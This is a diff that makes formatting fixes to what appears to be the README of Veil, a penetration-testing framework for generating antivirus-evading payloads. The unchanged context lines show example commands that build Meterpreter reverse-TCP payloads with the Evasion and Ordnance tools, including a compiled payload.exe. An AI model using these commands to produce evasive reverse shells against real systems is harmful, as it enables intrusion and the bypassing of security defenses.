@@ -122,7 +122,7 @@ Main menu choice:
 ```
 
 **Help**
-```
+```bash
 $ ./Veil.py --help
 usage: Veil.py [--list-tools] [-t TOOL] [--update] [--setup] [--config]
                [--version] [--ip IP] [--port PORT] [--list-payloads]
@@ -179,7 +179,7 @@ Veil is a framework containing multiple tools.
 $
 ```
 
-**Veil Evasion CLI **
+**Veil Evasion CLI**
 
 ```bash
 $ ./Veil.py -t Evasion -p go/meterpreter/rev_tcp.py --ip 127.0.0.1 --port 4444
@@ -223,7 +223,7 @@ $ file /var/lib/veil/output/compiled/payload.exe
 $
 ```
 
-**Veil Ordnance CLI **
+**Veil Ordnance CLI**
 
 ```bash
 $ ./Veil.py -t Ordnance --ordnance-payload rev_tcp --ip 127.0.0.1 --port 4444
